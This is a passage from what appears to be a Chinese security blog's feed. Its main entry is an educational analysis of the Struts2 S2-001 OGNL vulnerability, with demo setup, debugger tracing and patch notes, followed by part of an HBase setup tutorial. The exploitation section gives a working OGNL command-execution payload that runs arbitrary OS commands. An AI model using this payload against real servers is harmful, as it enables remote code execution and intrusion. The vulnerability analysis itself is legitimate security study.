        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hive是一个数据仓库基础工具在Hadoop中用来处理结构化数据。它架构在Hadoop之上，总归为大
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
      <category term="hive" scheme="https://zhengbao.wang/tags/hive/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计入门之s2-001复现分析</title>
    <link href="https://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://zhengbao.wang/java代码审计入门之s2-001复现分析/</id>
    <published>2019-04-13T09:56:47.000Z</published>
    <updated>2019-04-17T08:32:59.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>入门JAVA代码审计的第一篇文章，还是决定以漏洞之王<code>struts2</code>下手，本篇即以学习为目的，复现分析<code>S2-001</code>,虽然该漏洞已过去十多年，但是前前后后还是折腾了好几天。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>官方给出的漏洞影响版本为WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8。<br>本例中使用struts-2.0.1版本进行复现分析。</p><p>工具选择使用了<code>IDEA</code>，下面记录一下如何使用<code>IDEA</code>创建第一个struts2项目。<br>IDEA需下载<code>Ultimate</code>版本,<code>Community</code>版本无法创建<code>Java EE</code>工程。<br>首先<code>New Project</code>创建<code>Struts2</code>项目，<code>Libraries</code>选择<code>Set up library later</code><br><img src="https://i.loli.net/2019/04/13/5cb199d238fb8.png" alt><br>下一步之后填写项目名称即可创建起一个struts2 project<br><img src="https://i.loli.net/2019/04/13/5cb19a73c7b2b.png" alt><br>下载<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">struts-2.0.1-all</a></p><p>在项目目录<code>WEB-INF</code>下新建<code>lib</code>文件夹，将所需要的jar包从下载目录中导入到<code>lib</code>文件夹下</p><p>将全部jar包选中，右键<code>Add as Library</code><br><img src="https://i.loli.net/2019/04/13/5cb1a68f2cf2d.png" alt><br>填写一个Library Name<br><img src="https://i.loli.net/2019/04/13/5cb19dbb0a748.png" alt><br>然后<code>File-&gt;Project strutsure</code><br><img src="https://i.loli.net/2019/04/13/5cb19e06e4c46.png" alt><br>然后在<code>Modules</code>下选中<code>struts2-001</code><br><img src="https://i.loli.net/2019/04/13/5cb1a74e548e5.png" alt><br>之后再在<code>Artifacts</code>如下图将<code>struts2-001</code>put into output root，完成后点击OK.<br><img src="https://i.loli.net/2019/04/13/5cb19efb3dc76.png" alt><br>之后按下图创建<code>Tomcat server</code><br><img src="https://i.loli.net/2019/04/13/5cb1a09665c32.png" alt><br>在配置页面点击<code>Fix</code>,其他默认即可。<br><img src="https://i.loli.net/2019/04/13/5cb1a0d149c67.png" alt><br>至此即可看到一个struts2项目启动成功。<br><img src="https://i.loli.net/2019/04/13/5cb1a7b081bbd.png" alt><br>因为漏洞是在表单验证失败时发生的，这里继续编写一个表单验证的Demo，以复现漏洞。<br>在<code>WEB</code>目录下修改<code>index.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sign On<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">action</span>=<span class="string">"Login"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"username"</span> <span class="attr">name</span>=<span class="string">"username"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">s:submit</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后新建<code>welcome.jsp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">s:property</span> <span class="attr">value</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">s:property</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在<code>src</code>下新建<code>com.demo.action</code>package<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> <span class="title">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String getUsername() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String getPassword() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> void setUsername(String username) &#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> void setPassword(String password) &#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String execute() &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改<code>struts.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"s2"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"Login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.Login"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>之后即可运行程序出现登陆Demo<br><img src="https://i.loli.net/2019/04/13/5cb1a96ed125a.png" alt></p><h2 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h2><p>在分析之前还是看一下十多年前官方的描述<br><img src="https://s2.ax1x.com/2019/04/12/AqalV0.png" alt="AqalV0.png"><br>看到问题是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用<br>OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。<br>第一次分析JAVA代码，还是觉得无从下断分析，但是既然是OGNL表达式导致的问题，那么表达式必然会经过OGNL解析并返回结果，前辈们给出的分析思路便是在OGNL表达式原生API <code>getValue</code>处下断点，该方法用于解析OGNL表达式并返回表达式的值。<br><img src="https://i.loli.net/2019/04/13/5cb147fc19bfc.png" alt><br>下断后便可发送payload<code>%{1+1}</code>，直到在断点处出现我们的payload,此时在调用栈中即可看到漏洞发生的整个过程。<br><img src="https://i.loli.net/2019/04/12/5cb00c397a2ee.png" alt><br>然后便可以根据调用栈开始分析过程。<br>首先我们的payload是从<code>index.jsp</code>输入的，这里需要了解的是jsp的本质也是一个Servlet，在执行jsp的时候tomcat会将其转化为java代码，比如这里<code>index.jsp</code>被转化为<code>index_jsp.java</code>。<br><img src="https://i.loli.net/2019/04/13/5cb157f27980b.png" alt><br>之后struts便会调用<code>ComponentTagSupport</code>类中<code>doStartTag</code> <code>doEndTag</code>方法对<code>index_JSP.hava</code>中的struts标签进行处理。<br><img src="https://i.loli.net/2019/04/13/5cb1583bbf7c7.png" alt><br>上图可以看出，调用<code>doEndTag</code>方法对标签时会调用<code>this.component.end()</code>方法。<br>跟进之后在<code>UIBean</code>类中<code>end</code>方法中会继续调用同类下的<code>evaluateParams</code><br><img src="https://i.loli.net/2019/04/13/5cb159a769188.png" alt><br>跟进<code>evaluateParams</code>，该方法会对标签属性取得name之后判断是否开启<code>altSyntax</code>功能，开启则会用<code>%{}</code>将标签属性值名称包裹，用于使用OGNL表达式对其处理。<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">altSyntax</span> 功能是 <span class="keyword">Struts </span><span class="number">2</span> 框架用于处理标签内容的一种新语法（不同于普通的 HTML ），该功能主要作用在于支持对标签中的 OGNL 表达式进行解析并执行。该功能在<span class="keyword">struts2核心配置文件struts.properties中默认开启。</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/13/5cb15a1922f79.png" alt><br>然后username经过上面处理之后，进入到该类下的<code>getValue</code>方法查询表达式的值，继续跟进。<br><img src="https://i.loli.net/2019/04/13/5cb15dcf9e97c.png" alt><br>在该方法中调用<code>TextParseUtil.translateVariables</code>。<br><img src="https://i.loli.net/2019/04/13/5cb15e428937d.png" alt><br>之后调用了该类下的同名方法<code>translateVariables</code>，对OGNL表达式进行了递归处理，从而使得我们的payload可以在递归处理时被OGNL表达式执行。<br>继续查看该方法，便可以看到使用了<code>while(true)</code>对表达式进行了递归处理。<br><img src="https://i.loli.net/2019/04/13/5cb15f12d6784.png" alt><br>之后便对表达式去掉<code>%{}</code>调用<code>stack.findValue</code>即<code>OgnlValueStack</code>类下的<code>findValue</code>，并最终调用了Ognl的<code>getValue</code>方法对表达式进行取值<br><img src="https://i.loli.net/2019/04/13/5cb15fe7d316b.png" alt><br>在<code>getValue</code>中可以看到取到了我们的payload<br><img src="https://i.loli.net/2019/04/13/5cb160217abad.png" alt><br>之后取得的值复制给<code>o</code>并最终复制给<code>expression</code>，继续在while循环中被处理。<br><img src="https://i.loli.net/2019/04/13/5cb161298df9b.png" alt><br>最终在OGNL表达式中被处理，获得计算结果<code>2</code>。<br><img src="https://i.loli.net/2019/04/13/5cb161c75292f.png" alt></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>POC<br><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="symbol">#a</span>=(new java.lang.<span class="type">ProcessBuilder</span>(new java.lang.<span class="type">String</span>[]&#123;<span class="comment">"whoami"</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),<span class="symbol">#b</span>=<span class="symbol">#a</span>.getInputStream(),<span class="symbol">#c</span>=new java.io.<span class="type">InputStreamReader</span>(<span class="symbol">#b</span>),<span class="symbol">#d</span>=new java.io.<span class="type">BufferedReader</span>(<span class="symbol">#c</span>),<span class="symbol">#e</span>=new char[<span class="number">50000</span>],<span class="symbol">#d</span>.read(<span class="symbol">#e</span>),<span class="symbol">#f</span>=<span class="symbol">#context</span>.get(<span class="comment">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>),<span class="symbol">#f</span>.getWriter().println(new java.lang.<span class="type">String</span>(<span class="symbol">#e</span>)),<span class="symbol">#f</span>.getWriter().flush(),<span class="symbol">#f</span>.getWriter().close()&#125;</span><br></pre></td></tr></table></figure></p><p>修改<code>new java.lang.String[]{&quot;whoami&quot;}</code>即可执行任意命令</p><p>如需参数可这样利用<code>new java.lang.String[]{&quot;net&quot;,&quot;user&quot;}</code></p><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p>在<code>XWork2.0.4</code>增加了loopCount判断以取消对OGNL的递归解析<br><img src="https://i.loli.net/2019/04/13/5cb1b1bce7cb1.png" alt></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05  参考"></a>0x05  参考</h2><p><a href="http://d1iv3.me/2018/02/01/S2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">S2-001漏洞分析</a><br><a href="https://wystatic.tuisec.win/static/drops/papers-340.html" target="_blank" rel="noopener">OGNL设计及使用不当造成的远程代码执行漏洞</a><br><a href="https://www.sqyysec.com/Struts-001%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Struts-001远程代码执行漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;入门JAVA代码审计的第一篇文章，还是决定以漏洞之王&lt;code&gt;struts2&lt;/code&gt;下手，本
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="https://zhengbao.wang/tags/java/"/>
    
      <category term="struts2" scheme="https://zhengbao.wang/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>Hadoop之Hbase架构环境搭建及使用JAVA API远程连接</title>
    <link href="https://zhengbao.wang/Hadoop%E4%B9%8BHbase%E6%9E%B6%E6%9E%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8JAVA%20API%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/"/>
    <id>https://zhengbao.wang/Hadoop之Hbase架构环境搭建及使用JAVA API远程连接/</id>
    <published>2019-04-10T03:38:19.000Z</published>
    <updated>2019-05-08T02:38:33.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hbase全称为Hadoop Database，是一个分布式的存储系统。Hbase使用Hadoop的HDFS作为其文件存储系统，使用Hadoop的MapReduce来处理Hbase中的海量数据，使用zookeeper作为其协调工具。</p><p>查看本教程之前，请确保已安装配置好Hadoop，可参考<a href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a>,<a href="https://zhengbao.wang/%E4%BD%BF%E7%94%A8Hadoop-JAVA-API-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5HDFS/">使用Hadoop JAVA API 远程连接HDFS</a></p><h2 id="0x01-下载安装"><a href="#0x01-下载安装" class="headerlink" title="0x01 下载安装"></a>0x01 下载安装</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先在<a href="https://hbase.apache.org/downloads.html" target="_blank" rel="noopener">官网下载Hbase</a><br><img src="https://i.loli.net/2019/04/10/5cad52022e1ed.png" alt><br>选择对应版本的bin文件，国内根据推荐的清华源下载即可。<br><img src="https://i.loli.net/2019/04/10/5cad5233119c1.png" alt><br>linux下可使用<code>wget</code>命令下载，我下载的为<code>2.1.4</code>版本<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/apache/</span>hbase<span class="regexp">/2.1.4/</span>hbase-<span class="number">2.1</span>.<span class="number">4</span>-bin.tar.gz</span><br></pre></td></tr></table></figure></p><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>下载后即可解压到目录,我这里直接在当前目录解压<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zxvf</span> <span class="selector-tag">hbase-2</span><span class="selector-class">.1</span><span class="selector-class">.4-bin</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/10/5cad5357a9309.png" alt></p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>进入解压后的目录使用<code>pwd</code>命令查看路径<br><img src="https://i.loli.net/2019/04/10/5cad53b262f1e.png" alt><br>然后修改<code>.bashrc</code>配置环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.bashrc</span><br><span class="line">在最后添加</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HBASE_HOME</span>=/home/wzb/hbase-2.1.4</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$HBASE_HOME/bin</span><br><span class="line">保存后退出</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/10/5cad54b3853b2.png" alt><br>然后使用<code>source ~/.bashrc</code>命令使配置生效<br>然后输入命令<code>hbase</code>可看到环境变量配置成功<br><img src="https://i.loli.net/2019/04/10/5cad5563ddb7e.png" alt></p><h2 id="0x02-启动Hbase"><a href="#0x02-启动Hbase" class="headerlink" title="0x02 启动Hbase"></a>0x02 启动Hbase</h2><p>在启动hbase之前。首先进行相应的配置修改</p><h3 id="配置hbase-env-sh"><a href="#配置hbase-env-sh" class="headerlink" title="配置hbase-env.sh"></a>配置hbase-env.sh</h3><p>修改hbase所在目录下的<code>conf</code>目录的<code>hbase-env.sh</code><br>如我的位置为<code>/home/wzb/hbase-2.1.4/conf/hbase-env.sh</code><br>首先配置环境变量<code>export JAVA_HOME=/usr/local/java/jdk1.8.0_201</code>,此处修改为你的java环境变量，如不知道，可通过<code>echo $JAVA_HOME</code>查看<br>然后配置<code>export HBASE_MANAGES_ZK=true</code>,使用其自带的<code>zookeeper</code><br><img src="https://i.loli.net/2019/04/10/5cad583900c70.png" alt></p><h3 id="配置hbase-site-xml"><a href="#配置hbase-site-xml" class="headerlink" title="配置hbase-site.xml"></a>配置hbase-site.xml</h3><p>然后继续配置<code>conf</code>目录下的<code>hbase-site.xml</code><br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;configuration&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>hbase.rootdir<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span>hdfs:<span class="comment">//192.168.111.147:9000/hbase&lt;/value&gt;</span></span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line"><span class="params">&lt;name&gt;</span>hbase.zookeeper.quorum<span class="params">&lt;/name&gt;</span>  </span><br><span class="line"><span class="params">&lt;value&gt;</span><span class="number">192.168</span><span class="number">.111</span><span class="number">.147</span><span class="params">&lt;/value&gt;</span>  </span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line">        <span class="params">&lt;property&gt;</span></span><br><span class="line"><span class="params">&lt;name&gt;</span>hbase.cluster.distributed<span class="params">&lt;/name&gt;</span></span><br><span class="line"><span class="params">&lt;value&gt;</span>true<span class="params">&lt;/value&gt;</span></span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line">                <span class="params">&lt;name&gt;</span>hbase.zookeeper.property.dataDir<span class="params">&lt;/name&gt;</span></span><br><span class="line">                <span class="params">&lt;value&gt;</span><span class="meta-keyword">/home/</span>wzb/Hbase<span class="meta-keyword">/zookeeper/</span>tmp<span class="params">&lt;/value&gt;</span></span><br><span class="line">        <span class="params">&lt;/property&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line"> <span class="params">&lt;name&gt;</span>hbase.unsafe.stream.capability.enforce<span class="params">&lt;/name&gt;</span></span><br><span class="line"> <span class="params">&lt;value&gt;</span>false<span class="params">&lt;/value&gt;</span></span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line"><span class="params">&lt;property&gt;</span></span><br><span class="line"><span class="params">&lt;name&gt;</span>hbase.wal.provider<span class="params">&lt;/name&gt;</span></span><br><span class="line"><span class="params">&lt;value&gt;</span>filesystem<span class="params">&lt;/value&gt;</span></span><br><span class="line"><span class="params">&lt;/property&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="params">&lt;/configuration&gt;</span></span><br></pre></td></tr></table></figure></p><p>注意标识处根据自己环境修改<br><img src="https://i.loli.net/2019/04/10/5cad58dbebb50.png" alt></p><h3 id="下载htrace-core-3-1-0-incubating-jar"><a href="#下载htrace-core-3-1-0-incubating-jar" class="headerlink" title="下载htrace-core-3.1.0-incubating.jar"></a>下载htrace-core-3.1.0-incubating.jar</h3><p>下载<a href="https://jar-download.com/artifacts/org.apache.htrace/htrace-core/3.1.0-incubating/source-code" target="_blank" rel="noopener">htrace-core-3.1.0-incubating.jar</a>并移至hbase安装目录下的<code>lib</code>文件夹</p><h3 id="启动start-hbase-sh"><a href="#启动start-hbase-sh" class="headerlink" title="启动start-hbase.sh"></a>启动<code>start-hbase.sh</code></h3><p>配置修改好后即可通过<code>start-hbase.sh</code>命令启动<br>在启动之前，请先使用<code>start-all.sh</code>启动hadoop相关进程<br><img src="https://i.loli.net/2019/04/10/5cad59b844412.png" alt><br>然后即可使用命令<code>start-hbase.sh</code>启动hbase<br><img src="https://i.loli.net/2019/04/10/5cad5a028b379.png" alt><br>通过<code>jps</code>可看到比刚才多出来<code>HMaster</code> <code>HRegionServer</code> <code>HQuorumPeer</code>三个进程，如后面出现错误可看查这些进程是否正常启动，如未启动移步文章末尾问题解决可查笔者记录的解决办法。</p><h3 id="访问apache-Hbase"><a href="#访问apache-Hbase" class="headerlink" title="访问apache Hbase"></a>访问apache Hbase</h3><p>此处正常启动后继续<br>然后通过浏览器访问<code>http://192.168.111.147:16010/master-status</code><br>此处ip即为你在<code>hbase-site.xml</code>文件中配置的ip<br><img src="https://i.loli.net/2019/04/10/5cad5b4b6c9dd.png" alt><br>至此Hbase启动成功。</p><h2 id="0x03-Hbase-shell"><a href="#0x03-Hbase-shell" class="headerlink" title="0x03 Hbase shell"></a>0x03 Hbase 